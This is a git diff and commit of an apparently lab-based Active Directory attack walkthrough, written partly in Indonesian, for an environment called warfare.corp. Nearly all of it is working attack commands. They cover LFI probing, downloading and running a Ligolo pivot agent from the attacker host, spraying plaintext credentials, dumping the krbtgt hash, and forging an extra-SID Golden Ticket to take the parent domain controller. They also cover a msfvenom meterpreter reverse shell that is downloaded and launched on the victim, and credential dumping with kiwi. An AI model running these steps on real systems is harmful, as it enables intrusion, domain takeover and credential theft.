-192.168.98.2

+### 13. Golden Ticket Attack

-impacket-ticketer -aesKey <aes256_key> -domain child.warfare.corp \
-  -domain-sid <child_sid> -extra-sid <parent_sid-RID> Administrator

+-domain child.warfare.corp \
+-domain-sid S-1-5-21-3754860944-83624914-1883974761 \
+-extra-sid S-1-5-21-3375883379-808943238-3239386119-519 Administrator
 export KRB5CCNAME=Administrator.ccache
 ```

+

+
+```bash
 getST.py -spn 'CIFS/dc01.warfare.corp' -k -no-pass child.warfare.corp/Administrator
 export KRB5CCNAME=Administrator@CIFS_dc01.warfare.corp@WARFARE.CORP.ccache

+msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.98.15 lport=1234 -f exe -o rev.exe

+```bash

-Invoke-WebRequest http://192.168.98.15:1237/payloads.exe -OutFile payloads.exe
-Start-Process .\payloads.exe

+Invoke-WebRequest http://192.168.98.15:1237/payloads.exe -OutFile C:\Users\corpmngr\Downloads\payloads.exe
+cd C:\Users\corpmngr\Downloads
 ```
 
-### Attacker Handler
+### Handler di Kali
 
 ```bash
 msfconsole
 use exploit/multi/handler
@@ -211,41 +223,57 @@
 set payload windows/x64/meterpreter/reverse_tcp

-### Meterpreter
+### Jalankan Payload di Victim
 
-```bash
-load kiwi
-creds_all
+```powershell
+.\payloads.exe
 ```
 
 ---
 
-## üîç Child to Parent Escalation Summary
+### Lateral Movement dan Privilege Escalation Parent Domain
 
-* Identify both domains using PowerView or AD cmdlets
-* Get krbtgt hash (child)
-* Get SID (child & parent)
-* Generate Golden Ticket with parent SID
-* Access parent DC via psexec
+1. Cek user dengan `creds_all` via meterpreter.
+2. Cari DC info:
 
+```powershell
+Get-ADDomainController -Server child.warfare.corp
+Get-ADForest
+```
+
+3. Dapatkan SID parent/child:
+
+```powershell
+Get-DomainSID -Domain child.warfare.corp
+Get-DomainSID -Domain warfare.corp
+```
+
+4. Gunakan ticketer.py:
+
\ No newline at end of file
+```bash
+impacket-ticketer -aesKey <AESKEY> -domain child.warfare.corp -domain-sid <CHILD_SID> -extra-sid <PARENT_SID>-519 Administrator

commits.name: Commit-0
commits.content:
## Active Directory Attack Flow - Step-by-Step Guide

### üéØ Objective

Melakukan eksploitasi dari initial access ke domain child hingga privilege escalation dan pivoting ke parent domain dalam lingkungan Active Directory.

---

## üõ† Initial Reconnaissance

### 1. Scan Network & Port

```bash
nmap -sV 192.168.80.10
```

### 2. Web Enumeration (Port 80 Open)

* Test LFI:

```bash
http://192.168.80.10/index.php?page=../../../../etc/passwd
```

* Directory brute-force:

```bash
dirsearch -u http://192.168.80.10 -w /home/miquela/wordlist/big.txt
feroxbuster -u http://192.168.80.10 -w /home/miquela/wordlist/medium.txt
gobuster dir -u http://192.168.80.10 -w /home/miquela/wordlist/big.txt
```

Cari informasi sensitif seperti kredensial.

### 3. SSH Access

```bash
ssh privilege@192.168.80.10
```

---

## üß± Post-Exploitation - Web Server

### 1. Enumerasi User & Privilege

```bash
whoami
hostname
id
sudo -l
sudo id
```

### 2. Network Enumeration

```bash
ifconfig / ip a / ip r / route -n / netstat
```

### 3. Search Sensitive Files

```bash
sudo grep -Rni "keyword" / 2>/dev/null
find / -type f -iname "filename" 2>/dev/null
```

Contoh: Temukan file `places.sqlite` lalu eksplorasi menggunakan `sqlite3`:

```bash
sqlite3 places.sqlite
.tables
select * from moz_bookmarks;
```

---

## üîÄ Network Pivoting via Ligolo-ng

### Attacker Machine

```bash
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up
ligolo-proxy -selfcert
sudo python3 -m http.server 8000
```

### Pivot Machine (SSH Session)

```bash
wget http://10.10.200.23:8000/agent
chmod +x agent
./agent -connect 10.10.200.23:11601 -ignore-cert
```

### Back to Attacker

```bash
start (in ligolo)
listener_add --addr 0.0.0.0:1234 --to 0.0.0.0:4444
sudo ip route add 192.168.98.0/24 dev ligolo
```

---

## üß≠ Internal Network Enumeration

### 1. Ping & Scan

```bash
nmap -sn 192.168.98.0/24
ping 192.168.98.2
```

### 2. Save Live Hosts

```bash
cat > target.txt
192.168.98.2
192.168.98.15
...
```

### 3. Credential Spray

```bash
crackmapexec smb target.txt -u john -p 'User1@#$%6'
crackmapexec smb 192.168.98.30 -u john -p 'User1@#$%6' --lsa
crackmapexec smb target.txt -u corpmngr -p 'User4&*&*'
```

### 4. Hosts File Update

```bash
sudo nano /etc/hosts
192.168.98.2 warfare.corp dc01.warfare.corp
192.168.98.120 child.warfare.corp cdc.child.warfare.corp
```

---

## üéü Golden Ticket Attack (Child Domain)

### 1. Extract Hash krbtgt

```bash
secretsdump.py child/corpmngr@192.168.98.120 -hashes :<NTLM> -just-dc-user 'child\\krbtgt'
```

### 2. Domain SID

```bash
lookupsid.py child/corpmngr:'User4&*&*'@child.warfare.corp
lookupsid.py child/corpmngr:'User4&*&*'@warfare.corp
```

### 3. Generate Golden Ticket

```bash
impacket-ticketer -aesKey <aes256_key> -domain child.warfare.corp \
  -domain-sid <child_sid> -extra-sid <parent_sid-RID> Administrator
export KRB5CCNAME=Administrator.ccache
```

### 4. Sync Time & Request ST

```bash
sudo ntpdig -S 192.168.98.2
getST.py -spn 'CIFS/dc01.warfare.corp' -k -no-pass child.warfare.corp/Administrator
export KRB5CCNAME=Administrator@CIFS_dc01.warfare.corp@WARFARE.CORP.ccache
```

### 5. Extract Admin Hash

```bash
secretsdump.py -k -no-pass dc01.warfare.corp -just-dc-user 'warfare\\Administrator'
```

### 6. Domain Admin Access

```bash
psexec.py child.warfare.corp/Administrator@dc01.warfare.corp -k -no-pass -target-ip 192.168.98.2
```

---

## üîÅ Persistence & Lateral Movement

### Upload Payloads

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<pivot_ip> lport=1234 -f exe -o rev.exe
```

### In Victim Machine

```powershell
cd Downloads
Invoke-WebRequest http://192.168.98.15:1237/payloads.exe -OutFile payloads.exe
Start-Process .\payloads.exe
```

### Attacker Handler

```bash
msfconsole
use exploit/multi/handler
set lhost 0.0.0.0
set lport 4321
set payload windows/x64/meterpreter/reverse_tcp
run
```

### Meterpreter

```bash
load kiwi
creds_all
```

---

## üîç Child to Parent Escalation Summary

* Identify both domains using PowerView or AD cmdlets
* Get krbtgt hash (child)
* Get SID (child & parent)
* Generate Golden Ticket with parent SID
* Access parent DC via psexec

---

## üì¶ Tools to Upload to Victim

* payload.exe
* agent (ligolo)
* mimikatz.exe
* PowerView\.ps1

### Import PowerView:

```powershell
Import-Module .\PowerView.ps1
```

---

## ‚úÖ Conclusion

Dengan memanfaatkan kombinasi recon, pivoting, dan teknik Kerberos seperti Golden Ticket, kita dapat melakukan privilege escalation dari domain child ke parent dalam lingkungan Active Directory secara terstruktur dan efisien.
